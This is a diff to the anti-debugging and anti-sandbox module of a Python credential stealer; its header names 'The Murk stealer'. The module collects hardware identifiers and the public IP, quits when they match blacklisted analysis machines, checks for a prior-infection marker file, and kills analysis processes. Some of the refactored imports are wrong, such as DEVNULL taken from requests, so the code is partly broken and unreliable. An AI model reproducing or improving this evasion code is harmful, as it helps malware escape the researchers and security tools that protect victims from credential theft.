@@ -10,15 +10,16 @@
 #             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
 #-----------------------------------------------------------------------------#
 
-import os
+from os import _exit, environ, sep, getenv
+from os.path import exists
 from subprocess import check_output, PIPE
-import psutil
-import uuid
-import wmi
-import subprocess
-import requests
-import platform
-import json
+from psutil import cpuinfo, process_iter
+from uuid import UUID, getnode
+from wmi import WMI
+from subprocess import check_output
+from requests import DEVNULL, get
+from platform import system
+from json import loads
 from manager.blacklist import BlackList
 from manager.logger import Log
 
@@ -37,7 +38,7 @@ def checkHWID():
 
 def checkMAC():
     try:
-        mac = uuid.UUID(int=uuid.getnode()).hex[-12:]
+        mac = UUID(int=getnode()).hex[-12:]
         return ':'.join([mac[e:e + 2] for e in range(0, 12, 2)])
     except:
         return "No data"
@@ -46,7 +47,7 @@ def checkMAC():
 
 def checkBIOS():
     try:
-        c = wmi.WMI()
+        c = WMI()
         bios = c.Win32_BIOS()[0]
         return bios.SerialNumber.strip()
     except:
@@ -55,7 +56,7 @@ def checkBIOS():
 
 def checkManufacture():
     try:
-        c = wmi.WMI()
+        c = WMI()
         baseboard = c.Win32_BaseBoard()[0]
         return baseboard.Manufacturer.strip()
     except:
@@ -64,7 +65,7 @@ def checkManufacture():
 
 def checkBASE():
     try:
-        wmi_service = wmi.WMI()
+        wmi_service = WMI()
         baseboards = wmi_service.Win32_BaseBoard()
         return  baseboards[0].SerialNumber
     except:
@@ -74,7 +75,7 @@ def checkBASE():
 
 def checkCPU():
     try:
-        cpu_info = psutil.cpuinfo()
+        cpu_info = cpuinfo()
         return cpu_info[0].serial
     except:
         return "No data"
@@ -83,7 +84,7 @@ def checkCPU():
 
 def checkDrive():
     try:
-        c = wmi.WMI()
+        c = WMI()
         drives = c.Win32_DiskDrive()
         return drives[0].SerialNumber.strip()
     except:
@@ -92,7 +93,7 @@ def checkDrive():
 
 def checkHW_profile():
     try:
-        c = wmi.WMI()
+        c = WMI()
         hw_profiles = c.Win32_SystemDriver()
         for profile in hw_profiles:
             if profile.DisplayName == 'HW Profile GUID':
@@ -104,7 +105,7 @@ def checkHW_profile():
 
 def checkGUID():
     try:
-        output = subprocess.check_output(['reg', 'query', 'HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography', '/v', 'MachineGuid'], stderr=subprocess.DEVNULL)
+        output = check_output(['reg', 'query', 'HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography', '/v', 'MachineGuid'], stderr=DEVNULL)
         lines = output.decode().split('\n')
         for line in lines:
             if 'MachineGuid' in line:
@@ -118,7 +119,7 @@ def checkGUID():
 
 def checkGPU():
     try:
-        c = wmi.WMI()
+        c = WMI()
         gpu_info = []
         for gpu in c.Win32_VideoController():
             gpu_info.append((gpu.Name))
@@ -131,14 +132,14 @@ def checkGPU():
 
 def checkIP():
     try:
-        return json.loads(requests.get('https://ipinfo.io/json').text)['ip']
+        return loads(get('https://ipinfo.io/json').text)['ip']
     except:
         return "No data"
 
 
 def checkPlatform():
     try:
-        return platform.system()
+        return system()
     except:
         return "No data"
 
@@ -151,74 +152,74 @@ def checkPlatform():
 
 
 def AntiDebug(oneStart):
-    pathf = os.environ['USERPROFILE'] + os.sep + r'AppData\Local'
+    pathf =  environ['USERPROFILE'] +  sep + r'AppData\Local'
     
     if oneStart:
-        if (os.path.exists(rf'{pathf}\system\sysFiles\winDef\log20742384.txt')):# Checks if a virus has opened on this PC
-            os._exit(0)
+        if (exists(rf'{pathf}\system\sysFiles\winDef\log20742384.txt')):# Checks if a virus has opened on this PC
+             _exit(0)
 
-    if os.path.exists(rf'{pathf}\windll'):
-        os._exit(0)
+    if  exists(rf'{pathf}\windll'):
+         _exit(0)
 
-    processlist = psutil.process_iter(['name'])
+    processlist = process_iter(['name'])
 
-    if os.getenv("USERPROFILE") in BlackList.Users:
-        os._exit(0)
+    if  getenv("USERPROFILE") in BlackList.Users:
+         _exit(0)
 
 
-    if os.getenv('COMPUTERNAME') in BlackList.PC_Name:
-        os._exit(0)
+    if  getenv('COMPUTERNAME') in BlackList.PC_Name:
+         _exit(0)
 
 
     if checkHWID() in BlackList.HWID:
-        os._exit(0)
+         _exit(0)
 
 
     if checkMAC() in BlackList.Mac_Address:
-        os._exit(0)
+         _exit(0)
 
     if checkBIOS() in BlackList.Bios:
-        os._exit(0)
+         _exit(0)
 
     
     if checkManufacture() in BlackList.Manufacture:
-        os._exit(0)
+         _exit(0)
 
 
     if checkBASE() in BlackList.BaseBoard:
-        os._exit(0)
+         _exit(0)
 
 
     if checkCPU() in BlackList.CPU:
-        os._exit(0)
+         _exit(0)
 
 
     if checkDrive() in BlackList.Drive:
-        os._exit(0)
+         _exit(0)
 
 
     if checkHW_profile() in BlackList.HW_Profile_GUID:
-        os._exit(0)
+         _exit(0)
  
 
 
     if checkGUID() in BlackList.Machine_GUID:
-        os._exit(0)
+         _exit(0)
 
     gpus = checkGPU()
     for gpu in gpus:
         if gpu in BlackList.GPU:
-            os._exit(0)
+             _exit(0)
 
     if checkIP() in BlackList.ip:
-        os._exit(0)
+         _exit(0)
 
     if checkPlatform() in BlackList.Platform:
-        os._exit(0)
+         _exit(0)
     
     for proc in processlist:
             if any(procstr in proc.name().lower() for procstr in kill_Processes):
                 try:
                     proc.kill()
-                except (psutil.NoSuchProcess, psutil.AccessDenied):
+                except:
                     pass
